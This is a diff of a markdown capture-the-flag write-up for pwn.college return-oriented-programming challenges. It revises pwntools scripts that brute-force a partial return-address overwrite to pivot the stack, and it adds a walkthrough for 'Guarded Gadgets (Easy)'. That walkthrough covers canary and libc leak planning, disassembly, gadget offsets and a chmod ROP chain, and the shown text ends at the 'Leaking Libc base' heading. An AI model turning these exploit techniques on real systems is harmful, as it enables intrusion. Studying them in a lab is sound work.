@@ -11257,28 +11257,46 @@ for b2 in range(256):
 from pwn import *
 import random
 
-context.arch = "amd64"
-context.log_level = "error"
+context.arch = 'amd64'
+context.log_level = 'error'
 
-rbp_offset = 104
+# Memory addresses and offsets
+rip_offset = 112
+rbp_offset = rip_offset - 8
 
+# Generate all 4096 possible 3-byte patterns for leave ; ret at libc offset 0x578c8
 patterns = []
 for b2 in range(256):
     for N in range(16):
         val = (b2 * 0x10000 + N * 0x1000 + 0x578c8) & 0xFFFFFF
-        patterns.append(val.to_bytes(3, "little"))
+        patterns.append(val.to_bytes(3, 'little'))
 random.shuffle(patterns)
 
 for pat in patterns * 20:
     p = None
     try:
-        p = process("/challenge/pivotal-pursuit-easy")
+        p = process('/challenge/pivotal-pursuit-easy')
+
+        # Parse leak
         p.recvuntil(b"located at: ", timeout=5)
-        buf = int(p.recvline().strip().rstrip(b"."), 16)
-        p.send(b"A" * rbp_offset + p64(buf - 16) + pat)
+        buf = int(p.recvline().strip().rstrip(b'.'), 16)
+
+        # Pivot logic
+        # win_ptr is at buf-8.
+        # Target RBP at buf-16 makes RSP land on win_ptr after 'pop rbp'.
+        target_rbp = buf - 16
+
+        # 3-byte partial overwrite payload
+        payload = flat(
+            b"A" * rbp_offset,
+            target_rbp,
+            pat
+        )
+
+        p.send(payload)
         out = p.recvall(timeout=2)
         if b"pwn.college{" in out:
-            print(out.decode(errors="ignore"))
+            print(out.decode(errors='ignore'))
             break
     except Exception:
         pass
@@ -11612,29 +11630,46 @@ for b2 in range(256):
 from pwn import *
 import random
 
-context.arch = "amd64"
-context.log_level = "error"
+context.arch = 'amd64'
+context.log_level = 'error'
 
+# Memory addresses and offsets
 rip_offset = 80
 rbp_offset = rip_offset - 8
 
+# Generate all 4096 possible 3-byte patterns for leave ; ret at libc offset 0x578c8
 patterns = []
 for b2 in range(256):
     for N in range(16):
         val = (b2 * 0x10000 + N * 0x1000 + 0x578c8) & 0xFFFFFF
-        patterns.append(val.to_bytes(3, "little"))
+        patterns.append(val.to_bytes(3, 'little'))
 random.shuffle(patterns)
 
 for pat in patterns * 20:
     p = None
     try:
-        p = process("/challenge/pivotal-pursuit-hard")
+        p = process('/challenge/pivotal-pursuit-hard')
+
+        # Parse leak
         p.recvuntil(b"located at: ", timeout=5)
-        buf = int(p.recvline().strip().rstrip(b"."), 16)
-        p.send(b"A" * rbp_offset + p64(buf - 16) + pat)
+        buf = int(p.recvline().strip().rstrip(b'.'), 16)
+
+        # Pivot logic
+        # win_ptr is at buf-8.
+        # Target RBP at buf-16 makes RSP land on win_ptr after 'pop rbp'.
+        target_rbp = buf - 16
+
+        # 3-byte partial overwrite payload
+        payload = flat(
+            b"A" * rbp_offset,
+            target_rbp,
+            pat
+        )
+
+        p.send(payload)
         out = p.recvall(timeout=2)
         if b"pwn.college{" in out:
-            print(out.decode(errors="ignore"))
+            print(out.decode(errors='ignore'))
             break
     except Exception:
         pass
@@ -11650,3 +11685,789 @@ Leaving!
 ### Goodbye!
 pwn.college{Ev46VWhcbN-YqygnU-Fiv_DrFf1.0FN2MDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## Guarded Gadgets (Easy)
+
+```
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ /challenge/guarded-gadgets-easy 
+###
+### Welcome to /challenge/guarded-gadgets-easy!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+
+PIE is turned on! This means that you do not know where any of the gadgets in the main binary are. However, you can do a
+partial overwrite of the saved instruction pointer in order to execute 1 gadget! If that saved instruction pointer goes
+to libc, you will need to ROP from there. If that saved instruction pointer goes to the main binary, you will need to
+ROP from there. You may need need to execute your payload several times to account for the randomness introduced. This
+might take anywhere from 0-12 bits of bruteforce depending on the scenario.
+
+ASLR means that the address of the stack is not known,
+but I will simulate a memory disclosure of it.
+By knowing where the stack is, you can now reference data
+that you write onto the stack.
+Be careful: this data could trip up your ROP chain,
+because it could be interpreted as return addresses.
+You can use gadgets that shift the stack appropriately to avoid that.
+[LEAK] Your input buffer is located at: 0x7fff181df710.
+
+This will simulate an 8-byte arbitrary read.
+Address in hex to read from:
+```
+
+We need the following:
+
+- [ ] Offset between buffer and stack canary 
+- [ ] Offset between buffer and stored return address to `main()`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+
+### Strategy
+ 
+Three problems to solve: canary, ASLR, and privilege. The trick is doing it in **two stages within the same process**, so ASLR is defeated for free on the second stage.
+ 
+#### Stage 1: Leak canary, restart `main()`
+ 
+1. Use the arbitrary read primitive to fetch `buf + 72`, exactly where the canary lives on the stack.
+2. Overwrite only the low 2 bytes of saved RIP with a value targeting `__libc_start_main+0x69` inside libc. That offset contains:
+```
+mov argv from lsm_stack → rsi
+mov argc from lsm_stack → edi
+mov main_ptr from lsm_stack → rax
+call *rax                       ← restarts main() cleanly
+```
+ 
+3. PIE randomizes only the top nibble of the page offset (4 bits = 1-in-16 odds), so this is a **1-in-16 brute force**. The lower 12 bits of the libc offset are fixed.
+4. `main()` restarts inside the same process — same canary, same ASLR layout.
+#### Stage 2: Leak libc, ROP chain
+ 
+1. Use the arbitrary read on `buf + 88` (saved RIP = `__libc_start_main+243`). Subtract the known offset to get the exact libc base.
+2. Compute all gadget and function addresses from libc base.
+3. Send `chmod("!", 0o777)` ROP chain — the binary runs with elevated privileges so the `chmod` succeeds.
+
+### `puts@plt` (Procedure Linkage Table entry)
+
+```
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ objdump -d /challenge/guarded-gadgets-easy | grep "<puts@plt>:"
+0000000000001140 <puts@plt>:
+```
+
+```
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -r /challenge/guarded-gadgets-easy | grep "puts"
+000000004f78  000400000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
+```
+
+### Binary analysis
+
+#### `main()`
+
+```
+pwndbg> disassemble main
+Dump of assembler code for function main:
+   0x000000000000226d <+0>:     endbr64
+   0x0000000000002271 <+4>:     push   rbp
+   0x0000000000002272 <+5>:     mov    rbp,rsp
+   0x0000000000002275 <+8>:     sub    rsp,0xa0
+   0x000000000000227c <+15>:    mov    DWORD PTR [rbp-0x84],edi
+   0x0000000000002282 <+21>:    mov    QWORD PTR [rbp-0x90],rsi
+   0x0000000000002289 <+28>:    mov    QWORD PTR [rbp-0x98],rdx
+   0x0000000000002290 <+35>:    mov    rax,QWORD PTR fs:0x28
+   0x0000000000002299 <+44>:    mov    QWORD PTR [rbp-0x8],rax
+   0x000000000000229d <+48>:    xor    eax,eax
+   0x000000000000229f <+50>:    mov    rax,QWORD PTR [rip+0x2d7a]        # 0x5020 <stdin@@GLIBC_2.2.5>
+   0x00000000000022a6 <+57>:    mov    ecx,0x0
+   0x00000000000022ab <+62>:    mov    edx,0x2
+   0x00000000000022b0 <+67>:    mov    esi,0x0
+   0x00000000000022b5 <+72>:    mov    rdi,rax
+   0x00000000000022b8 <+75>:    call   0x11c0 <setvbuf@plt>
+   0x00000000000022bd <+80>:    mov    rax,QWORD PTR [rip+0x2d4c]        # 0x5010 <stdout@@GLIBC_2.2.5>
+   0x00000000000022c4 <+87>:    mov    ecx,0x0
+   0x00000000000022c9 <+92>:    mov    edx,0x2
+   0x00000000000022ce <+97>:    mov    esi,0x0
+   0x00000000000022d3 <+102>:   mov    rdi,rax
+   0x00000000000022d6 <+105>:   call   0x11c0 <setvbuf@plt>
+   0x00000000000022db <+110>:   lea    rdi,[rip+0xeb6]        # 0x3198
+   0x00000000000022e2 <+117>:   call   0x1140 <puts@plt>
+   0x00000000000022e7 <+122>:   mov    rax,QWORD PTR [rbp-0x90]
+   0x00000000000022ee <+129>:   mov    rax,QWORD PTR [rax]
+   0x00000000000022f1 <+132>:   mov    rsi,rax
+   0x00000000000022f4 <+135>:   lea    rdi,[rip+0xea1]        # 0x319c
+   0x00000000000022fb <+142>:   mov    eax,0x0
+   0x0000000000002300 <+147>:   call   0x1170 <printf@plt>
+   0x0000000000002305 <+152>:   lea    rdi,[rip+0xe8c]        # 0x3198
+   0x000000000000230c <+159>:   call   0x1140 <puts@plt>
+   0x0000000000002311 <+164>:   mov    edi,0xa
+   0x0000000000002316 <+169>:   call   0x1120 <putchar@plt>
+   0x000000000000231b <+174>:   mov    eax,DWORD PTR [rbp-0x84]
+   0x0000000000002321 <+180>:   mov    DWORD PTR [rbp-0x78],eax
+   0x0000000000002324 <+183>:   mov    rax,QWORD PTR [rbp-0x90]
+   0x000000000000232b <+190>:   mov    QWORD PTR [rbp-0x68],rax
+   0x000000000000232f <+194>:   mov    rax,QWORD PTR [rbp-0x98]
+   0x0000000000002336 <+201>:   mov    QWORD PTR [rbp-0x60],rax
+   0x000000000000233a <+205>:   lea    rdi,[rip+0xe6f]        # 0x31b0
+   0x0000000000002341 <+212>:   call   0x1140 <puts@plt>
+   0x0000000000002346 <+217>:   lea    rdi,[rip+0xedb]        # 0x3228
+   0x000000000000234d <+224>:   call   0x1140 <puts@plt>
+   0x0000000000002352 <+229>:   mov    rax,rsp
+   0x0000000000002355 <+232>:   mov    QWORD PTR [rip+0x2d04],rax        # 0x5060 <sp_>
+   0x000000000000235c <+239>:   mov    rax,rbp
+   0x000000000000235f <+242>:   mov    QWORD PTR [rip+0x2cda],rax        # 0x5040 <bp_>
+   0x0000000000002366 <+249>:   mov    rdx,QWORD PTR [rip+0x2cd3]        # 0x5040 <bp_>
+   0x000000000000236d <+256>:   mov    rax,QWORD PTR [rip+0x2cec]        # 0x5060 <sp_>
+   0x0000000000002374 <+263>:   sub    rdx,rax
+   0x0000000000002377 <+266>:   mov    rax,rdx
+   0x000000000000237a <+269>:   shr    rax,0x3
+   0x000000000000237e <+273>:   add    rax,0x2
+   0x0000000000002382 <+277>:   mov    QWORD PTR [rip+0x2cc7],rax        # 0x5050 <sz_>
+   0x0000000000002389 <+284>:   mov    rax,QWORD PTR [rip+0x2cb0]        # 0x5040 <bp_>
+   0x0000000000002390 <+291>:   add    rax,0x8
+   0x0000000000002394 <+295>:   mov    QWORD PTR [rip+0x2cbd],rax        # 0x5058 <rp_>
+   0x000000000000239b <+302>:   lea    rdi,[rip+0xeee]        # 0x3290
+   0x00000000000023a2 <+309>:   call   0x1140 <puts@plt>
+   0x00000000000023a7 <+314>:   lea    rdi,[rip+0xf62]        # 0x3310
+   0x00000000000023ae <+321>:   call   0x1140 <puts@plt>
+   0x00000000000023b3 <+326>:   lea    rdi,[rip+0xfce]        # 0x3388
+   0x00000000000023ba <+333>:   call   0x1140 <puts@plt>
+   0x00000000000023bf <+338>:   lea    rdi,[rip+0x103a]        # 0x3400
+   0x00000000000023c6 <+345>:   call   0x1140 <puts@plt>
+   0x00000000000023cb <+350>:   lea    rdi,[rip+0x10a6]        # 0x3478
+   0x00000000000023d2 <+357>:   call   0x1140 <puts@plt>
+   0x00000000000023d7 <+362>:   lea    rdi,[rip+0x10ea]        # 0x34c8
+   0x00000000000023de <+369>:   call   0x1140 <puts@plt>
+   0x00000000000023e3 <+374>:   lea    rdi,[rip+0x1116]        # 0x3500
+   0x00000000000023ea <+381>:   call   0x1140 <puts@plt>
+   0x00000000000023ef <+386>:   lea    rdi,[rip+0x113a]        # 0x3530
+   0x00000000000023f6 <+393>:   call   0x1140 <puts@plt>
+   0x00000000000023fb <+398>:   lea    rdi,[rip+0x116e]        # 0x3570
+   0x0000000000002402 <+405>:   call   0x1140 <puts@plt>
+   0x0000000000002407 <+410>:   lea    rdi,[rip+0x1182]        # 0x3590
+   0x000000000000240e <+417>:   call   0x1140 <puts@plt>
+   0x0000000000002413 <+422>:   lea    rdi,[rip+0x11ae]        # 0x35c8
+   0x000000000000241a <+429>:   call   0x1140 <puts@plt>
+   0x000000000000241f <+434>:   lea    rdi,[rip+0x11da]        # 0x3600
+   0x0000000000002426 <+441>:   call   0x1140 <puts@plt>
+   0x000000000000242b <+446>:   lea    rax,[rbp-0x50]
+   0x000000000000242f <+450>:   mov    rsi,rax
+   0x0000000000002432 <+453>:   lea    rdi,[rip+0x120f]        # 0x3648
+   0x0000000000002439 <+460>:   mov    eax,0x0
+   0x000000000000243e <+465>:   call   0x1170 <printf@plt>
+   0x0000000000002443 <+470>:   lea    rdi,[rip+0x122e]        # 0x3678
+   0x000000000000244a <+477>:   call   0x1140 <puts@plt>
+   0x000000000000244f <+482>:   mov    QWORD PTR [rbp-0x70],0x0
+   0x0000000000002457 <+490>:   lea    rdi,[rip+0x1247]        # 0x36a5
+   0x000000000000245e <+497>:   call   0x1140 <puts@plt>
+   0x0000000000002463 <+502>:   lea    rax,[rbp-0x70]
+   0x0000000000002467 <+506>:   mov    rsi,rax
+   0x000000000000246a <+509>:   lea    rdi,[rip+0x1251]        # 0x36c2
+   0x0000000000002471 <+516>:   mov    eax,0x0
+   0x0000000000002476 <+521>:   call   0x11e0 <__isoc99_scanf@plt>
+   0x000000000000247b <+526>:   mov    rax,QWORD PTR [rbp-0x70]
+   0x000000000000247f <+530>:   mov    rax,QWORD PTR [rax]
+   0x0000000000002482 <+533>:   mov    QWORD PTR [rbp-0x58],rax
+   0x0000000000002486 <+537>:   mov    rax,QWORD PTR [rbp-0x70]
+   0x000000000000248a <+541>:   mov    rdx,QWORD PTR [rbp-0x58]
+   0x000000000000248e <+545>:   mov    rsi,rax
+   0x0000000000002491 <+548>:   lea    rdi,[rip+0x122d]        # 0x36c5
+   0x0000000000002498 <+555>:   mov    eax,0x0
+   0x000000000000249d <+560>:   call   0x1170 <printf@plt>
+   0x00000000000024a2 <+565>:   lea    rax,[rbp-0x50]
+   0x00000000000024a6 <+569>:   mov    edx,0x1000
+   0x00000000000024ab <+574>:   mov    rsi,rax
+   0x00000000000024ae <+577>:   mov    edi,0x0
+   0x00000000000024b3 <+582>:   call   0x1180 <read@plt>
+   0x00000000000024b8 <+587>:   mov    DWORD PTR [rbp-0x74],eax
+   0x00000000000024bb <+590>:   mov    eax,DWORD PTR [rbp-0x74]
+   0x00000000000024be <+593>:   cdqe
+   0x00000000000024c0 <+595>:   lea    rcx,[rbp-0x50]
+   0x00000000000024c4 <+599>:   mov    rdx,QWORD PTR [rip+0x2b8d]        # 0x5058 <rp_>
+   0x00000000000024cb <+606>:   sub    rcx,rdx
+   0x00000000000024ce <+609>:   mov    rdx,rcx
+   0x00000000000024d1 <+612>:   add    rax,rdx
+   0x00000000000024d4 <+615>:   shr    rax,0x3
+   0x00000000000024d8 <+619>:   mov    rdx,rax
+   0x00000000000024db <+622>:   mov    eax,DWORD PTR [rbp-0x74]
+   0x00000000000024de <+625>:   mov    esi,eax
+   0x00000000000024e0 <+627>:   lea    rdi,[rip+0x11f9]        # 0x36e0
+   0x00000000000024e7 <+634>:   mov    eax,0x0
+   0x00000000000024ec <+639>:   call   0x1170 <printf@plt>
+   0x00000000000024f1 <+644>:   lea    rdi,[rip+0x1220]        # 0x3718
+   0x00000000000024f8 <+651>:   call   0x1140 <puts@plt>
+   0x00000000000024fd <+656>:   lea    rdi,[rip+0x127c]        # 0x3780
+   0x0000000000002504 <+663>:   call   0x1140 <puts@plt>
+   0x0000000000002509 <+668>:   mov    eax,DWORD PTR [rbp-0x74]
+   0x000000000000250c <+671>:   cdqe
+   0x000000000000250e <+673>:   lea    rcx,[rbp-0x50]
+   0x0000000000002512 <+677>:   mov    rdx,QWORD PTR [rip+0x2b3f]        # 0x5058 <rp_>
+   0x0000000000002519 <+684>:   sub    rcx,rdx
+   0x000000000000251c <+687>:   mov    rdx,rcx
+   0x000000000000251f <+690>:   add    rax,rdx
+   0x0000000000002522 <+693>:   shr    rax,0x3
+   0x0000000000002526 <+697>:   add    eax,0x1
+   0x0000000000002529 <+700>:   mov    edx,eax
+   0x000000000000252b <+702>:   mov    rax,QWORD PTR [rip+0x2b26]        # 0x5058 <rp_>
+   0x0000000000002532 <+709>:   mov    esi,edx
+   0x0000000000002534 <+711>:   mov    rdi,rax
+   0x0000000000002537 <+714>:   call   0x1718 <print_chain>
+   0x000000000000253c <+719>:   lea    rdi,[rip+0x127f]        # 0x37c2
+   0x0000000000002543 <+726>:   call   0x1140 <puts@plt>
+   0x0000000000002548 <+731>:   nop
+   0x0000000000002549 <+732>:   lea    rdi,[rip+0x127b]        # 0x37cb
+   0x0000000000002550 <+739>:   call   0x1140 <puts@plt>
+   0x0000000000002555 <+744>:   mov    eax,0x0
+   0x000000000000255a <+749>:   mov    rsi,QWORD PTR [rbp-0x8]
+   0x000000000000255e <+753>:   xor    rsi,QWORD PTR fs:0x28
+   0x0000000000002567 <+762>:   je     0x256e <main+769>
+   0x0000000000002569 <+764>:   call   0x1160 <__stack_chk_fail@plt>
+   0x000000000000256e <+769>:   leave
+   0x000000000000256f <+770>:   ret
+End of assembler dump.
+```
+
+Let's set a breakpoint at `main+582`, where the `read()` call is made, in order to find the buffer offset to the canary and saved RIP.
+
+```
+pwndbg> break *(main+582)
+Breakpoint 1 at 0x24b3
+```
+
+```
+pwndbg> run
+Starting program: /challenge/guarded-gadgets-easy 
+Downloading separate debug info for system-supplied DSO at 0x7ffe0e948000
+Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffe0e948000.                                                                  
+Downloading separate debug info for /lib/libcapstone.so.5
+Download failed: Invalid argument.  Continuing without separate debug info for /lib/libcapstone.so.5.                                                                                  
+###
+### Welcome to /challenge/guarded-gadgets-easy!
+###
+
+[LEAK] Your input buffer is located at: 0x7ffe0e9228a0.
+
+This will simulate an 8-byte arbitrary read.
+Address in hex to read from:
+0x7ffe0e9228a0
+[LEAK] *0x7ffe0e9228a0 = 0x00000000000000c2
+
+
+Breakpoint 1, 0x00005e1c69bd94b3 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────────────────────────────────────────────────────────[ LAST SIGNAL ]────────────────────────────────────────────────────────────────────────────────────
+Breakpoint hit at 0x5e1c69bd94b3
+────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────
+ RAX  0x7ffe0e9228a0 ◂— 0xc2
+ RBX  0x5e1c69bd9570 (__libc_csu_init) ◂— endbr64
+ RCX  0
+ RDX  0x1000
+ RDI  0
+ RSI  0x7ffe0e9228a0 ◂— 0xc2
+ R8   0x2d
+ R9   0x2d
+ R10  0x5e1c69bda6db ◂— 0x6365520000000a0a /* '\n\n' */
+ R11  0x246
+ R12  0x5e1c69bd8200 (_start) ◂— endbr64
+ R13  0x7ffe0e9229e0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffe0e9228f0 ◂— 0
+ RSP  0x7ffe0e922850 ◂— 0
+ RIP  0x5e1c69bd94b3 (main+582) ◂— call read@plt
+─────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
+ ► 0x5e1c69bd94b3 <main+582>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/1)
+        buf: 0x7ffe0e9228a0 ◂— 0xc2
+        nbytes: 0x1000
+ 
+   0x5e1c69bd94b8 <main+587>    mov    dword ptr [rbp - 0x74], eax
+   0x5e1c69bd94bb <main+590>    mov    eax, dword ptr [rbp - 0x74]
+   0x5e1c69bd94be <main+593>    cdqe  
+   0x5e1c69bd94c0 <main+595>    lea    rcx, [rbp - 0x50]
+   0x5e1c69bd94c4 <main+599>    mov    rdx, qword ptr [rip + 0x2b8d]     RDX, [rp_]
+   0x5e1c69bd94cb <main+606>    sub    rcx, rdx
+   0x5e1c69bd94ce <main+609>    mov    rdx, rcx
+   0x5e1c69bd94d1 <main+612>    add    rax, rdx
+   0x5e1c69bd94d4 <main+615>    shr    rax, 3
+   0x5e1c69bd94d8 <main+619>    mov    rdx, rax
+───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffe0e922850 ◂— 0
+01:0008│-098 0x7ffe0e922858 —▸ 0x7ffe0e9229f8 —▸ 0x7ffe0e922ea3 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-090 0x7ffe0e922860 —▸ 0x7ffe0e9229e8 —▸ 0x7ffe0e922e83 ◂— '/challenge/guarded-gadgets-easy'
+03:0018│-088 0x7ffe0e922868 ◂— 0x100000000
+04:0020│-080 0x7ffe0e922870 ◂— 0
+05:0028│-078 0x7ffe0e922878 ◂— 1
+06:0030│-070 0x7ffe0e922880 —▸ 0x7ffe0e9228a0 ◂— 0xc2
+07:0038│-068 0x7ffe0e922888 —▸ 0x7ffe0e9229e8 —▸ 0x7ffe0e922e83 ◂— '/challenge/guarded-gadgets-easy'
+─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5e1c69bd94b3 main+582
+   1   0x737019aac083 __libc_start_main+243
+   2   0x5e1c69bd822e _start+46
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [ ] Offset between buffer and stack canary
+   - Location of the buffer: `0x7ffe0e9228a0`
+- [ ] Offset between buffer and stored return address to `main()`
+   - Location of the buffer: `0x7ffe0e9228a0`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7ffe0e922900:
+ rip = 0x5e1c69bd94b3 in main; saved rip = 0x737019aac083
+ called by frame at 0x7ffe0e9229d0
+ Arglist at 0x7ffe0e9228f0, args: 
+ Locals at 0x7ffe0e9228f0, Previous frame's sp is 0x7ffe0e922900
+ Saved registers:
+  rbp at 0x7ffe0e9228f0, rip at 0x7ffe0e9228f8
+```
+
+Just need to calculate the differences now.
+
+```
+pwndbg> p/d 0x7ffe0e9228e8 - 0x7ffe0e9228a0
+$1 = 72
+pwndbg> p/d 0x7ffe0e9228f8 - 0x7ffe0e9228a0
+$2 = 88
+```
+
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+
+### ROP gadgets
+
+We can look for the required ROP gadgets within Libc.
+
+```
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
+0x0000000000023b6a : pop rdi ; ret
+0x00000000000f57ad : pop rdi ; retf
+0x0000000000144ba9 : pop rdi ; retf 0xa
+```
+
+```
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rsi ; ret"
+0x000000000014b56c : cmp ecx, 0x3d8d48ff ; pop rsi ; ret
+0x000000000002601f : pop rsi ; ret
+```
+
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x23b6a`
+   - `pop rsi ; ret`: `0x2601f`
+
+### Libc functions
+
+Let's first find the offset of `system()` within Libc from the base address of the Libc.
+
+```
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
+  1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
+```
+
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x23b6a`
+   - `pop rsi ; ret`: `0x2601f`
+
+Now that we can calculate the Libc base address given the leak, let's find the offset of the `chmod()` function within Libc.
+
+```
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
+   125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
+   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
+  1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
+  2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
+```
+
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
+- [ ] Location of a NULL terminated string
+- [x] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `chmod()` within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x23b6a`
+   - `pop rsi ; ret`: `0x2601f`
+
+
+Let's find a relevant NULL terminated string.
+
+```
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ objdump -s -j .rodata /challenge/guarded-gadgets-easy | grep -E "[0-9a-f]{2}00"
+ 3000 01000200 00000000 2b2d2d2d 2d2d2d2d  ........+-------
+ 3050 2d2d2d2d 2d2d2d2d 2d2b0044 61746120  ---------+.Data 
+ 3070 79746573 29005374 61636b20 6c6f6361  ytes).Stack loca
+ 3090 3373207c 20253138 73207c0a 00000000  3s | %18s |.....
+ 30e0 78207c20 30782530 31366c78 207c0a00  x | 0x%016lx |..
+ 3100 6c657220 6661696c 65642074 6f20696e  ler failed to in
+ 3110 69746961 6c697a65 2e007c20 30782530  itialize..| 0x%0
+ 3120 31366c78 3a200028 554e4d41 50504544  16lx: .(UNMAPPED
+ 3140 20007265 74006361 6c6c0028 44495341   .ret.call.(DISA
+ 3150 5353454d 424c5920 4552524f 52292000  SSEMBLY ERROR) .
+ 3160 25303268 68782000 0a2b2d2d 2d205072  %02hhx ..+--- Pr
+ 3190 61742025 702e0a00 23232300 23232320  at %p...###.### 
+ 31a0 57656c63 6f6d6520 746f2025 73210a00  Welcome to %s!..
+ 3200 726d2061 20524f50 20617474 61636b2e  rm a ROP attack.
+ 3220 72696573 206f6600 6368616c 6c656e67  ries of.challeng
+ 3280 616d6d69 6e67210a 00000000 00000000  amming!.........
+ 3300 63616e20 646f2061 00000000 00000000  can do a........
+ 3380 65722067 6f657300 746f206c 6962632c  er goes.to libc,
+ 33f0 2077696c 6c206e65 65642074 6f000000   will need to...
+ 3400 524f5020 66726f6d 20746865 72652e20  ROP from there. 
+ 3470 2e205468 69730000 6d696768 74207461  . This..might ta
+ 34c0 696f2e0a 00000000 41534c52 206d6561  io......ASLR mea
+ 34f0 20697320 6e6f7420 6b6e6f77 6e2c0000   is not known,..
+ 3500 62757420 49207769 6c6c2073 696d756c  but I will simul
+ 3520 636c6f73 75726520 6f662069 742e0000  closure of it...
+ 3560 656e6365 20646174 61000000 00000000  ence data.......
+ 3580 6e746f20 74686520 73746163 6b2e0000  nto the stack...
+ 35c0 696e2c00 00000000 62656361 75736520  in,.....because 
+ 35f0 6e206164 64726573 7365732e 00000000  n addresses.....
+ 3600 596f7520 63616e20 75736520 67616467  You can use gadg
+ 3640 74686174 2e000000 5b4c4541 4b5d2059  that....[LEAK] Y
+ 3670 25702e0a 0a000000 54686973 2077696c  %p......This wil
+ 36c0 3a002570 005b4c45 414b5d20 2a257020  :.%p.[LEAK] *%p 
+ 36d0 3d203078 25303136 6c6c780a 0a000000  = 0x%016llx.....
+ 3700 7469616c 6c792025 64206761 64676574  tially %d gadget
+ 3710 732e0a00 00000000 4c657427 73207461  s.......Let's ta
+ 3770 20657865 63757461 626c6500 00000000   executable.....
+ 37c0 2e004c65 6176696e 67210023 23232047  ..Leaving!.### G
+ 37d0 6f6f6462 79652100                    oodbye!. 
+```
+
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
+- [ ] Location of a NULL terminated string: `0x37d6`
+- [x] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `chmod()` within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x23b6a`
+   - `pop rsi ; ret`: `0x2601f`
+
+### Leaking Libc base
+
